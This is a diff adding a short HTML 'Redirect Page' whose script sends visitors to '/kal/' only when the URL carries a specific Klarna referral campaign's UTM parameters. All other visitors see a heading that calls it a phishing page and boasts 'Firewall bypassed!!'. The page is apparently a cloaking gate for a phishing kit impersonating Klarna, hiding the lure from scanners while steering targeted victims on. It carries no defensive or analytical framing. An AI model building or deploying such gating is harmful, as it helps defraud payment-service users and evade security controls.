@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+    <script>
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const source = urlParams.get('utm_source');
+            const medium = urlParams.get('utm_medium');
+            const campaign = urlParams.get('utm_campaign');
+            
+            if (source === 'klarna' && medium === 'referral' && campaign === 'klarna-merchantboost') {
+                window.location.href = '/kal/';
+            }
+        };
+    </script>
+</head>
+<body>
+<h1>
+Just a normal Phishing page. Firewall bypassed!!
+</h1>
+</body>
+</html>
